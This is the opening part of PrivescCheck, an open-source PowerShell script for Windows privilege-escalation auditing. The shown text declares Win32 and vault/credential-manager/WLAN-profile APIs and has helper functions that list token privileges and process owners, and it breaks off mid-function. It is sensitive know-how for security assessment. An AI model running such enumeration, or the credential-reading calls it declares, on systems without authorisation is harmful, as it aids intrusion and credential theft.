<#
    This scripts is an extended and updated version of PowerUp. I tried to filter out as many false
    positives as I could and I also added some extra checks based on well known privilege escalation
    cheat sheets (see links below).

    Author: @itm4n
    Credit: @harmj0y @mattifestation
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    
    Links:
        https://github.com/itm4n
        https://github.com/HarmJ0y/PowerUp
        https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
        https://book.hacktricks.xyz/windows/windows-local-privilege-escalation  
#>

#Requires -Version 2

# ----------------------------------------------------------------
# Win32 stuff  
# ----------------------------------------------------------------
#region Win32
<#
https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
#>
$CSharpSource = @'
private const Int32 ANYSIZE_ARRAY = 1;

[System.FlagsAttribute]
public enum ServiceAccessFlags : uint
{
    QueryConfig = 1,
    ChangeConfig = 2,
    QueryStatus = 4,
    EnumerateDependents = 8,
    Start = 16,
    Stop = 32,
    PauseContinue = 64,
    Interrogate = 128,
    UserDefinedControl = 256,
    Delete = 65536,
    ReadControl = 131072,
    WriteDac = 262144,
    WriteOwner = 524288,
    Synchronize = 1048576,
    AccessSystemSecurity = 16777216,
    GenericAll = 268435456,
    GenericExecute = 536870912,
    GenericWrite = 1073741824,
    GenericRead = 2147483648
}

[StructLayout(LayoutKind.Sequential)]
public struct LUID {
   public UInt32 LowPart;
   public Int32 HighPart;
}

[StructLayout(LayoutKind.Sequential)]
public struct SID_AND_ATTRIBUTES {
    public IntPtr Sid;
    public int Attributes;
}

[StructLayout(LayoutKind.Sequential, Pack = 4)]
public struct LUID_AND_ATTRIBUTES {
   public LUID Luid;
   public UInt32 Attributes;
}

public struct TOKEN_USER {
    public SID_AND_ATTRIBUTES User;
}

public struct TOKEN_PRIVILEGES {
    public int PrivilegeCount;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst=ANYSIZE_ARRAY)]
    public LUID_AND_ATTRIBUTES [] Privileges;
}

[StructLayout(LayoutKind.Sequential)]
public struct MIB_TCPROW_OWNER_PID
{
    public uint state;
    public uint localAddr;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
    public byte[] localPort;
    public uint remoteAddr;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
    public byte[] remotePort;
    public uint owningPid;
}

[StructLayout(LayoutKind.Sequential)]
public struct MIB_UDPROW_OWNER_PID
{
    public uint localAddr;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
    public byte[] localPort;
    public uint owningPid;
}

[StructLayout(LayoutKind.Sequential)]
public struct MIB_TCP6ROW_OWNER_PID
{
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
    public byte[] localAddr;
    public uint localScopeId;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
    public byte[] localPort;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
    public byte[] remoteAddr;
    public uint remoteScopeId;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
    public byte[] remotePort;
    public uint state;
    public uint owningPid;
}

[StructLayout(LayoutKind.Sequential)]
public struct MIB_UDP6ROW_OWNER_PID
{
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
    public byte[] localAddr;
    public uint localScopeId;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
    public byte[] localPort;
    public uint owningPid;
}

[StructLayout(LayoutKind.Sequential)]
public struct MIB_TCPTABLE_OWNER_PID
{
    public uint dwNumEntries;
    [MarshalAs(UnmanagedType.ByValArray, ArraySubType = UnmanagedType.Struct, SizeConst = 1)]
    public MIB_TCPROW_OWNER_PID[] table;
}

[StructLayout(LayoutKind.Sequential)]
public struct MIB_UDPTABLE_OWNER_PID
{
    public uint dwNumEntries;
    [MarshalAs(UnmanagedType.ByValArray, ArraySubType = UnmanagedType.Struct, SizeConst = 1)]
    public MIB_UDPROW_OWNER_PID[] table;
}

[StructLayout(LayoutKind.Sequential)]
public struct MIB_TCP6TABLE_OWNER_PID
{
    public uint dwNumEntries;
    [MarshalAs(UnmanagedType.ByValArray, ArraySubType = UnmanagedType.Struct, SizeConst = 1)]
    public MIB_TCP6ROW_OWNER_PID[] table;
}

[StructLayout(LayoutKind.Sequential)]
public struct MIB_UDP6TABLE_OWNER_PID
{
    public uint dwNumEntries;
    [MarshalAs(UnmanagedType.ByValArray, ArraySubType = UnmanagedType.Struct, SizeConst = 1)]
    public MIB_UDP6ROW_OWNER_PID[] table;

}

[StructLayout(LayoutKind.Sequential)]
public struct FILETIME
{
    public uint dwLowDateTime;
    public uint dwHighDateTime;
}

[StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
public struct CREDENTIAL
{
    public uint Flags;
    public uint Type;
    public string TargetName;
    public string Comment;
    public FILETIME LastWritten;
    public uint CredentialBlobSize;
    public IntPtr CredentialBlob;
    public uint Persist;
    public uint AttributeCount;
    public IntPtr Attributes;
    public string TargetAlias;
    public string UserName;
}

[StructLayout(LayoutKind.Sequential)]
public struct UNICODE_STRING
{
   public ushort Length;
   public ushort MaximumLength;
   public IntPtr Buffer;
}

[StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
public struct VAULT_ITEM_7
{
    public Guid SchemaId;
    public string FriendlyName;
    public IntPtr Resource;
    public IntPtr Identity;
    public IntPtr Authenticator;
    public UInt64 LastWritten;
    public UInt32 Flags;
    public UInt32 PropertiesCount;
    public IntPtr Properties;
}

[StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
public struct VAULT_ITEM_8
{
    public Guid SchemaId;
    public string FriendlyName;
    public IntPtr Resource;
    public IntPtr Identity;
    public IntPtr Authenticator;
    public IntPtr PackageSid;
    public UInt64 LastWritten;
    public UInt32 Flags;
    public UInt32 PropertiesCount;
    public IntPtr Properties;
}

[StructLayout(LayoutKind.Sequential)]
public struct VAULT_ITEM_DATA_HEADER
{
    public UInt32 SchemaElementId;
    public UInt32 Unknown1;
    public UInt32 Type;
    public UInt32 Unknown2;
}

[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
public struct WLAN_INTERFACE_INFO
{
    public Guid InterfaceGuid;
    [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
    public string strInterfaceDescription;
    public uint isState; // WLAN_INTERFACE_STATE
}

[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
public struct WLAN_PROFILE_INFO
{
    [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
    public string strProfileName;
    public uint dwFlags;
}

[DllImport("advapi32.dll", SetLastError=true)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool QueryServiceObjectSecurity(IntPtr serviceHandle, System.Security.AccessControl.SecurityInfos secInfo, byte[] lpSecDesrBuf, uint bufSize, out uint bufSizeNeeded);

[DllImport("advapi32.dll", SetLastError=true)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool CloseServiceHandle(IntPtr hSCObject);

[DllImport("advapi32.dll", SetLastError=true)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);

[DllImport("advapi32.dll", SetLastError=true)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool GetTokenInformation(IntPtr TokenHandle, UInt32 TokenInformationClass, IntPtr TokenInformation, UInt32 TokenInformationLength, out UInt32 ReturnLength);

[DllImport("advapi32.dll", CharSet=CharSet.Auto, SetLastError=true)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool LookupAccountSid(string lpSystemName, IntPtr Sid, System.Text.StringBuilder lpName, ref uint cchName, System.Text.StringBuilder ReferencedDomainName, ref uint cchReferencedDomainName, out int peUse);

[DllImport("advapi32.dll", CharSet=CharSet.Auto, SetLastError=true)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool LookupPrivilegeName(string lpSystemName, IntPtr lpLuid, System.Text.StringBuilder lpName, ref int cchName );

[DllImport("advapi32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool CredEnumerate(IntPtr Filter, UInt32 Flags, out UInt32 Count, out IntPtr Credentials);

[DllImport("advapi32.dll")]
public static extern void CredFree(IntPtr Buffer);

[DllImport("advapi32.dll", SetLastError=false)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool IsTextUnicode(IntPtr buf, UInt32 len, ref UInt32 opt);

[DllImport("kernel32.dll", SetLastError=true)]
public static extern IntPtr GetCurrentProcess();

[DllImport("kernel32.dll", SetLastError=true)]
public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

[DllImport("kernel32.dll", SetLastError=true)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool CloseHandle(IntPtr hObject);

[DllImport("kernel32.dll")]
public static extern UInt64 GetTickCount64();

[DllImport("kernel32.dll", CharSet=CharSet.Auto, SetLastError=true)]
public static extern uint GetFirmwareEnvironmentVariable(string lpName, string lpGuid, IntPtr pBuffer, uint nSize);

[DllImport("kernel32.dll", SetLastError=true)]
public static extern bool GetFirmwareType(ref uint FirmwareType);

[DllImport("iphlpapi.dll", SetLastError=true)]
public static extern uint GetExtendedTcpTable(IntPtr pTcpTable, ref int pdwSize, bool bOrder, int ulAf, uint TableClass, uint Reserved);

[DllImport("iphlpapi.dll", SetLastError=true)]
public static extern uint GetExtendedUdpTable(IntPtr pUdpTable, ref int pdwSize, bool bOrder, int ulAf, uint TableClass, uint Reserved);

[DllImport("vaultcli.dll", SetLastError=false)]
public static extern uint VaultEnumerateVaults(uint dwFlags, out int VaultsCount, out IntPtr ppVaultGuids);

[DllImport("vaultcli.dll", SetLastError=false)]
public static extern uint VaultOpenVault(IntPtr pVaultId, uint dwFlags, out IntPtr pVaultHandle);

[DllImport("vaultcli.dll", SetLastError=false)]
public static extern uint VaultEnumerateItems(IntPtr pVaultHandle, uint dwFlags, out int ItemsCount, out IntPtr ppItems);

[DllImport("vaultcli.dll", SetLastError=false, EntryPoint="VaultGetItem")]
public static extern uint VaultGetItem7(IntPtr pVaultHandle, ref Guid guidSchemaId, IntPtr pResource, IntPtr pIdentity, IntPtr pUnknown, uint iUnknown, out IntPtr pItem);

[DllImport("vaultcli.dll", SetLastError=false, EntryPoint="VaultGetItem")]
public static extern uint VaultGetItem8(IntPtr pVaultHandle, ref Guid guidSchemaId, IntPtr pResource, IntPtr pIdentity, IntPtr pPackageSid, IntPtr pUnknown, uint iUnknown, out IntPtr pItem);

[DllImport("vaultcli.dll", SetLastError=false)]
public static extern uint VaultFree(IntPtr pVaultItem);

[DllImport("vaultcli.dll", SetLastError=false)]
public static extern uint VaultCloseVault(ref IntPtr pVaultHandle);

[DllImport("Wlanapi.dll")]
public static extern uint WlanOpenHandle(uint dwClientVersion, IntPtr pReserved, out uint pdwNegotiatedVersion, out IntPtr hClientHandle);

[DllImport("Wlanapi.dll")]
public static extern uint WlanCloseHandle(IntPtr hClientHandle, IntPtr pReserved);

[DllImport("Wlanapi.dll")]
public static extern uint WlanEnumInterfaces(IntPtr hClientHandle, IntPtr pReserved, ref IntPtr ppInterfaceList);

[DllImport("Wlanapi.dll")]
public static extern void WlanFreeMemory(IntPtr pMemory);

[DllImport("Wlanapi.dll")]
public static extern uint WlanGetProfileList(IntPtr hClientHandle, [MarshalAs(UnmanagedType.LPStruct)]Guid interfaceGuid, IntPtr pReserved, out IntPtr ppProfileList);

[DllImport("Wlanapi.dll")]
public static extern uint WlanGetProfile(IntPtr clientHandle, [MarshalAs(UnmanagedType.LPStruct)] Guid interfaceGuid, [MarshalAs(UnmanagedType.LPWStr)] string profileName, IntPtr pReserved, [MarshalAs(UnmanagedType.LPWStr)] out string profileXml, ref uint flags, out uint pdwGrantedAccess);
'@

try {
    # Is the Type already defined?
    [PrivescCheck.Win32] | Out-Null 
} catch {
    # If not, create it by compiling the C# code in memory 
    $CompilerParameters = New-Object -TypeName System.CodeDom.Compiler.CompilerParameters
    $CompilerParameters.GenerateInMemory = $True
    $CompilerParameters.GenerateExecutable = $False 
    #$Compiler = New-Object -TypeName Microsoft.CSharp.CSharpCodeProvider
    #$Compiler.CompileAssemblyFromSource($CompilerParameters, $CSharpSource) 
    Add-Type -MemberDefinition $CSharpSource -Name 'Win32' -Namespace 'PrivescCheck' -Language CSharp -CompilerParameters $CompilerParameters
}
#endregion Win32


# ----------------------------------------------------------------
# Helpers 
# ----------------------------------------------------------------
#region Helpers 
$global:IgnoredPrograms = @("Common Files", "Internet Explorer", "ModifiableWindowsApps", "PackageManagement", "Windows Defender", "Windows Defender Advanced Threat Protection", "Windows Mail", "Windows Media Player", "Windows Multimedia Platform", "Windows NT", "Windows Photo Viewer", "Windows Portable Devices", "Windows Security", "WindowsPowerShell", "Microsoft.NET", "Windows Portable Devices", "dotnet", "MSBuild", "Intel", "Reference Assemblies")

function Convert-DateToString {
    <#
    .SYNOPSIS

    Helper - Converts a DateTime object to a string representation

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    The output string is a simplified version of the ISO format: YYYY-MM-DD hh:mm:ss. 
    
    .PARAMETER Date

    A System.DateTime object
    
    .EXAMPLE

    PS C:\> $Date = Get-Date; Convert-DateToString -Date $Date

    2020-01-16 - 10:26:11
    
    #>
    
    [CmdletBinding()] param(
        [System.DateTime]
        $Date
    )

    $OutString = ""
    $OutString += $Date.ToString('yyyy-MM-dd - HH:mm:ss')
    #$OutString += " ($($Date.ToString('o')))" # ISO format
    $OutString
}

function Convert-ServiceTypeToString {
    <#
    .SYNOPSIS

    Helper - Converts a service type (integer) to its actual name

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    Services have a type which is saved as an integer in the registry. This function will retrieve
    the "name" of the type based on this integer value.
    
    .PARAMETER ServiceType

    A service type as an integer
    
    .EXAMPLE

    PS C:\> Convert-ServiceTypeToString -ServiceType 16
    
    Win32OwnProcess
    
    #>
    
    [CmdletBinding()] param(
        [int]
        $ServiceType
    )

    $ServiceTypeEnum = @{
        "KernelDriver" =        "1";
        "FileSystemDriver" =    "2";
        "Adapter" =             "4";
        "RecognizerDriver" =    "8";
        "Win32OwnProcess" =     "16";
        "Win32ShareProcess" =   "32";
        "InteractiveProcess" =  "256";
    }

    $ServiceTypeEnum.GetEnumerator() | ForEach-Object { 
        if ( $_.value -band $ServiceType ) 
        {
            $_.name
        }
    }
}

function Convert-ServiceStartModeToString {
    <#
    .SYNOPSIS

    Helper - Convert a Start mode (integer) to its actual name

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    Services have a Start mode (e.g.: Automatic), which is saved as an integer in the registry.
    This function will retrieve the "name" of the Start mode based on this integer value. 
    
    .PARAMETER StartMode

    A Start mode as an integer
    
    .EXAMPLE

    PS C:\> Convert-ServiceStartModeToString -StartMode 2

    Automatic

    #>
    
    [CmdletBinding()] param(
        [int]
        $StartMode
    )

    $StartModeEnum = @{
        "Boot" =        "0";
        "System" =      "1";
        "Automatic" =   "2";
        "Manual" =      "3";
        "Disabled" =    "4";
    }

    $StartModeEnum.GetEnumerator() | ForEach-Object { 
        if ( $_.Value -eq $StartMode ) 
        {
            $_.Name
        }
    }
}

function Test-IsKnownService {

    [CmdletBinding()] param(
        [object]$Service
    )

    if ($Service) {

        $ImagePath = $Service.ImagePath        

        $SeparationCharacterSets = @('"', "'", ' ', "`"'", '" ', "' ", "`"' ")

        ForEach($SeparationCharacterSet in $SeparationCharacterSets) {

            $CandidatePaths = $ImagePath.Split($SeparationCharacterSet) | Where-Object {$_ -and ($_.trim() -ne '')}

            ForEach($CandidatePath in $CandidatePaths) {

                $TempPath = $([System.Environment]::ExpandEnvironmentVariables($CandidatePath))
                $TempPathResolved = Resolve-Path -Path $TempPath -ErrorAction SilentlyContinue -ErrorVariable ErrorResolvePath 
                if (-not $ErrorResolvePath) {

                    $File = Get-Item -Path $TempPathResolved -ErrorAction SilentlyContinue -ErrorVariable ErrorGetItem 
                    if (-not $ErrorGetItem) {

                        if ($File.VersionInfo.LegalCopyright -Like "*Microsoft Corporation*") {
                            return $True 
                        } else {
                            return $False
                        }
                    }
                }
            }
        }
    }

    return $False
}

function Get-UserPrivileges {
    <#
    .SYNOPSIS

    Helper - Enumerates the privileges of the current user 

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    Enumerates the privileges of the current user using the Windows API. First, it gets a handle 
    to the current access token using OpenProcessToken. Then it calls GetTokenInformation to list
    all the privileges that it contains along with their state (enabled/disabled). For each result
    a custom object is returned, indicating the name of the privilege and its state. 
    
    .EXAMPLE

    PS C:\> Get-UserPrivileges

    Name                          State    Description
    ----                          ------   -----------
    SeShutdownPrivilege           Disabled Shut down the system
    SeChangeNotifyPrivilege       Enabled  Bypass traverse checking
    SeUndockPrivilege             Disabled Remove computer from docking station
    SeIncreaseWorkingSetPrivilege Disabled Increase a process working set
    SeTimeZonePrivilege           Disabled Change the time zone

    .LINK

    https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants
    #>
    
    [CmdletBinding()] param()

    function Get-PrivilegeDescription {
        [CmdletBinding()] param(
            [string]
            $Name
        )

        $PrivilegeDescriptions = @{
            "SeAssignPrimaryTokenPrivilege" =               "Replace a process-level token";
            "SeAuditPrivilege" =                            "Generate security audits";
            "SeBackupPrivilege" =                           "Back up files and directories";
            "SeChangeNotifyPrivilege" =                     "Bypass traverse checking";
            "SeCreateGlobalPrivilege" =                     "Create global objects";
            "SeCreatePagefilePrivilege" =                   "Create a pagefile";
            "SeCreatePermanentPrivilege" =                  "Create permanent shared objects";
            "SeCreateSymbolicLinkPrivilege" =               "Create symbolic links";
            "SeCreateTokenPrivilege" =                      "Create a token object";
            "SeDebugPrivilege" =                            "Debug programs";
            "SeDelegateSessionUserImpersonatePrivilege" =   "Impersonate other users";
            "SeEnableDelegationPrivilege" =                 "Enable computer and user accounts to be trusted for delegation";
            "SeImpersonatePrivilege" =                      "Impersonate a client after authentication";
            "SeIncreaseBasePriorityPrivilege" =             "Increase scheduling priority";
            "SeIncreaseQuotaPrivilege" =                    "Adjust memory quotas for a process";
            "SeIncreaseWorkingSetPrivilege" =               "Increase a process working set";
            "SeLoadDriverPrivilege" =                       "Load and unload device drivers";
            "SeLockMemoryPrivilege" =                       "Lock pages in memory";
            "SeMachineAccountPrivilege" =                   "Add workstations to domain";
            "SeManageVolumePrivilege" =                     "Manage the files on a volume";
            "SeProfileSingleProcessPrivilege" =             "Profile single process";
            "SeRelabelPrivilege" =                          "Modify an object label";
            "SeRemoteShutdownPrivilege" =                   "Force shutdown from a remote system";
            "SeRestorePrivilege" =                          "Restore files and directories";
            "SeSecurityPrivilege" =                         "Manage auditing and security log";
            "SeShutdownPrivilege" =                         "Shut down the system";
            "SeSyncAgentPrivilege" =                        "Synchronize directory service data";
            "SeSystemEnvironmentPrivilege" =                "Modify firmware environment values";
            "SeSystemProfilePrivilege" =                    "Profile system performance";
            "SeSystemtimePrivilege" =                       "Change the system time";
            "SeTakeOwnershipPrivilege" =                    "Take ownership of files or other objects";
            "SeTcbPrivilege" =                              "Act as part of the operating system";
            "SeTimeZonePrivilege" =                         "Change the time zone";
            "SeTrustedCredManAccessPrivilege" =             "Access Credential Manager as a trusted caller";
            "SeUndockPrivilege" =                           "Remove computer from docking station";
            "SeUnsolicitedInputPrivilege" =                 "N/A";
        }

        $PrivilegeDescriptions[$Name]

    }

    # Get a handle to a process the current user owns 
    $ProcessHandle = [PrivescCheck.Win32]::GetCurrentProcess()
    Write-Verbose "Current process handle: $ProcessHandle"

    # Get a handle to the token corresponding to this process 
    $TOKEN_QUERY= 0x0008
    [IntPtr]$TokenHandle = [IntPtr]::Zero
    $Success = [PrivescCheck.Win32]::OpenProcessToken($ProcessHandle, $TOKEN_QUERY, [ref]$TokenHandle);
    $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

    if ($Success) {

        Write-Verbose "OpenProcessToken() OK - Token handle: $TokenHandle"

        # TOKEN_INFORMATION_CLASS - 3 = TokenPrivileges
        $TokenPrivilegesPtrSize = 0
        $Success = [PrivescCheck.Win32]::GetTokenInformation($TokenHandle, 3, 0, $Null, [ref]$TokenPrivilegesPtrSize)
        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

        if (-not ($TokenPrivilegesPtrSize -eq 0)) {

            Write-Verbose "GetTokenInformation() OK - TokenPrivilegesPtrSize = $TokenPrivilegesPtrSize"

            [IntPtr]$TokenPrivilegesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivilegesPtrSize)

            $Success = [PrivescCheck.Win32]::GetTokenInformation($TokenHandle, 3, $TokenPrivilegesPtr, $TokenPrivilegesPtrSize, [ref]$TokenPrivilegesPtrSize)
            $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if ($Success) {

                # Convert the unmanaged memory at offset $TokenPrivilegesPtr to a TOKEN_PRIVILEGES managed type 
                $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesPtr, [type] [PrivescCheck.Win32+TOKEN_PRIVILEGES])
                #$Offset = [System.IntPtr]::Add($TokenPrivilegesPtr, 4)
                # Properly Incrementing an IntPtr
                # https://docs.microsoft.com/en-us/archive/blogs/jaredpar/properly-incrementing-an-intptr
                $Offset = [IntPtr] ($TokenPrivilegesPtr.ToInt64() + 4)
                
                Write-Verbose "GetTokenInformation() OK - Privilege count: $($TokenPrivileges.PrivilegeCount)"

                For ($i = 0; $i -lt $TokenPrivileges.PrivilegeCount; $i++) {

                    # Cast the unmanaged memory at offset 
                    $LuidAndAttributes = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Offset, [type] [PrivescCheck.Win32+LUID_AND_ATTRIBUTES])
                    
                    # Copy LUID to unmanaged memory 
                    $LuidSize = [System.Runtime.InteropServices.Marshal]::SizeOf($LuidAndAttributes.Luid)
                    [IntPtr]$LuidPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LuidSize)
                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($LuidAndAttributes.Luid, $LuidPtr, $True)

                    # public static extern bool LookupPrivilegeName(string lpSystemName, IntPtr lpLuid, System.Text.StringBuilder lpName, ref int cchName );
                    [int]$Length = 0
                    $Success = [PrivescCheck.Win32]::LookupPrivilegeName($Null, $LuidPtr, $Null, [ref]$Length)
                    $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                    if (-not ($Length -eq 0)) {

                        Write-Verbose "LookupPrivilegeName() OK - Length = $Length"

                        $Name = New-Object -TypeName System.Text.StringBuilder
                        $Name.EnsureCapacity($Length + 1) |Out-Null
                        $Success = [PrivescCheck.Win32]::LookupPrivilegeName($Null, $LuidPtr, $Name, [ref]$Length)
                        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if ($Success) {

                            $PrivilegeName = $Name.ToString()

                            # SE_PRIVILEGE_ENABLED = 0x00000002
                            $PrivilegeEnabled = ($LuidAndAttributes.Attributes -band 2) -eq 2

                            Write-Verbose "LookupPrivilegeName() OK - Name: $PrivilegeName - Enabled: $PrivilegeEnabled"

                            $PrivilegeObject = New-Object -TypeName PSObject 
                            $PrivilegeObject | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $PrivilegeName
                            $PrivilegeObject | Add-Member -MemberType "NoteProperty" -Name "State" -Value $(if ($PrivilegeEnabled) { "Enabled" } else { "Disabled" })
                            $PrivilegeObject | Add-Member -MemberType "NoteProperty" -Name "Description" -Value $(Get-PrivilegeDescription -Name $PrivilegeName)
                            $PrivilegeObject

                        } else {
                            Write-Verbose ([ComponentModel.Win32Exception] $LastError)
                        }

                    } else {
                        Write-Verbose ([ComponentModel.Win32Exception] $LastError)
                    }

                    # Cleanup - Free unmanaged memory
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidPtr)

                    # Update the offset to point to the next LUID_AND_ATTRIBUTES structure in the unmanaged buffer
                    #$Offset = [System.IntPtr]::Add($Offset, [System.Runtime.InteropServices.Marshal]::SizeOf($LuidAndAttributes))
                    # Properly Incrementing an IntPtr
                    # https://docs.microsoft.com/en-us/archive/blogs/jaredpar/properly-incrementing-an-intptr
                    $Offset = [IntPtr] ($Offset.ToInt64() + [System.Runtime.InteropServices.Marshal]::SizeOf($LuidAndAttributes))
                }

            } else {
                Write-Verbose ([ComponentModel.Win32Exception] $LastError)
            }

            # Cleanup - Free unmanaged memory
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesPtr)

        } else {
            Write-Verbose ([ComponentModel.Win32Exception] $LastError)
        }

        # Cleanup - Close Token handle 
        $Success = [PrivescCheck.Win32]::CloseHandle($TokenHandle)
        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        if ($Success) {
            Write-Verbose "Token handle closed"
        } else {
            Write-Verbose ([ComponentModel.Win32Exception] $LastError)
        }

    } else {
        Write-Verbose ([ComponentModel.Win32Exception] $LastError)
    }
}

function Get-UserFromProcess() {
    <#
    .SYNOPSIS

    Helper - Gets the user associated to a given process

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    First it gets a handle to the process identified by the given PID. Then, it uses this handle to
    access the process token. GetTokenInformation() is then used to query the SID of the user.
    Finally the SID is converted to a domain name, user name and SID type. All this information is
    returned in a custom PS object. 
    
    .PARAMETER ProcessId

    The PID of the target process
    
    .EXAMPLE

    PS C:\> Get-UserFromProcess -ProcessId 6972

    Domain          Username Type
    ------          -------- ----
    DESKTOP-FEOHNOM lab-user User
    
    #>
    
    [CmdletBinding()] param(
        [Parameter(Mandatory=$true)]
        [int]
        $ProcessId
    )

    function Get-SidTypeName {
        param(
            $SidType
        )

        $SidTypeEnum = @{
            "User" = "1";
            "Group" = "2";
            "Domain" = "3";
            "Alias" = "4";
            "WellKnownGroup" = "5";
            "DeletedAccount" = "6";
            "Invalid" = "7";
            "Unknown" = "8";
            "Computer" = "9";
            "Label" = "10";
            "LogonSession" = "11";
        }

        $SidTypeEnum.GetEnumerator() | ForEach-Object { 
            if ( $_.value -eq $SidType ) 
            {
                $_.name
            }
        }
    }

    # PROCESS_QUERY_INFORMATION = 0x0400
    $AccessFlags = 0x0400
    $ProcessHandle = [PrivescCheck.Win32]::OpenProcess($AccessFlags, $False, $ProcessId)
    #$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

    if (-not ($Null -eq $ProcessHandle)) {

        Write-Verbose "OpenProcess() OK - Handle: $ProcessHandle"

        $TOKEN_QUERY= 0x0008
        [IntPtr]$TokenHandle = [IntPtr]::Zero
        $Success = [PrivescCheck.Win32]::OpenProcessToken($ProcessHandle, $TOKEN_QUERY, [ref]$TokenHandle);
        #$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

        if ($Success) {

            Write-Verbose "OpenProcessToken() OK - Handle: $ProcessHandle"

            # TOKEN_INFORMATION_CLASS - 1 = TokenUser
            $TokenUserPtrSize = 0
            $Success = [PrivescCheck.Win32]::GetTokenInformation($TokenHandle, 1, 0, $Null, [ref]$TokenUserPtrSize)
            $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if (($TokenUserPtrSize -gt 0) -and ($LastError -eq 122)) {

                Write-Verbose "GetTokenInformation() OK - Size: $TokenUserPtrSize"

                [IntPtr]$TokenUserPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenUserPtrSize)

                $Success = [PrivescCheck.Win32]::GetTokenInformation($TokenHandle, 1, $TokenUserPtr, $TokenUserPtrSize, [ref]$TokenUserPtrSize)
                $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error() 

                if ($Success) {

                    Write-Verbose "GetTokenInformation() OK"

                    # Cast unmanaged memory to managed TOKEN_USER struct 
                    $TokenUser = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenUserPtr, [type] [PrivescCheck.Win32+TOKEN_USER])

                    $SidType = 0

                    $UserNameSize = 256
                    $UserName = New-Object -TypeName System.Text.StringBuilder
                    $UserName.EnsureCapacity(256) | Out-Null

                    $UserDomainSize = 256
                    $UserDomain = New-Object -TypeName System.Text.StringBuilder
                    $UserDomain.EnsureCapacity(256) | Out-Null

                    $Success = [PrivescCheck.Win32]::LookupAccountSid($Null, $TokenUser.User.Sid, $UserName, [ref]$UserNameSize, $UserDomain, [ref]$UserDomainSize, [ref]$SidType)
                    $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                    if ($Success) {

                        $UserObject = New-Object -TypeName PSObject 
                        $UserObject | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value $UserDomain.ToString()
                        $UserObject | Add-Member -MemberType "NoteProperty" -Name "Username" -Value $UserName.ToString()
                        $UserObject | Add-Member -MemberType "NoteProperty" -Name "DisplayName" -Value "$($UserDomain.ToString())\$($UserName.ToString())"
                        $UserObject | Add-Member -MemberType "NoteProperty" -Name "Type" -Value $(Get-SidTypeName $SidType)
                        $UserObject
                        
                    } else {
                        Write-Verbose "LookupAccountSid() failed."
                        Write-Verbose ([ComponentModel.Win32Exception] $LastError)
                    }
                } else {
                    Write-Verbose "GetTokenInformation() failed."
                    Write-Verbose ([ComponentModel.Win32Exception] $LastError)
                }

                # Cleanup - Free unmanaged memory 
                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenUserPtr)
            }

            # Cleanup - Close token handle 
            $Success = [PrivescCheck.Win32]::CloseHandle($TokenHandle)
            $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($Success) {
                Write-Verbose "Token handle closed"
            } else {
